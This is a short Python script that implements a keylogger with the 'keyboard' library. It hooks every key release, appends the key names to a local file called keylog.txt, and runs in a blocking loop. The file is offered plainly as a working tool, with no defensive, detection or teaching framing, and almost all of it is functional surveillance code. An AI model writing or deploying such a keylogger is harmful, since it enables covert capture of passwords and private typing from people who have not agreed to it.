import keyboard

# Function to start the keylogger
def start_keylogger():
    log_file = "keylog.txt"
    print(f"Keylogger started. Logging keystrokes to {log_file}")

    # Start listening to keystrokes
    keyboard.on_release(callback=on_key_release)

    # Block the main thread, as the keyboard listener runs on a separate thread
    keyboard.wait()

# Callback function to handle key release events
def on_key_release(key):
    # Log only alphanumeric keys and special keys (like space, enter, etc.)
    if hasattr(key, 'name'):
        logged_key = str(key.name)
    else:
        logged_key = str(key)

    # Write the logged key to the log file
    with open("keylog.txt", "a") as f:
        f.write(logged_key + "\n")

# Main function to start the keylogger
def main():
    start_keylogger()

if __name__ == "__main__":
    main()

